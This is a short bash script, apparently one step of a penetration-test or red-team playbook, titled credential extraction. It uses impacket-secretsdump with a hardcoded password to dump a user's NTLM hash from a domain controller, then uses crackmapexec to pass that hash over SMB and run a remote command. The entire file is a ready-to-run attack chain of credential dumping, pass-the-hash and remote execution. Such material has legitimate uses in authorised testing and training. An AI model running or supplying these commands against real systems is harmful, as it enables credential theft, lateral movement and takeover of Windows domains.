#!/bin/bash
# 03-credential-extraction.sh
# Dump NTLM hashes via secretsdump
impacket-secretsdump jsmith:'Password123!'@192.168.10.10 \
  -just-dc-user aturner

# Pass-the-Hash verification
crackmapexec smb 192.168.10.10 \
  -u aturner \
  -H <NTLM_HASH>

# Remote command execution
crackmapexec smb 192.168.10.10 \
  -u aturner \
  -H <NTLM_HASH> \
  -x "whoami"
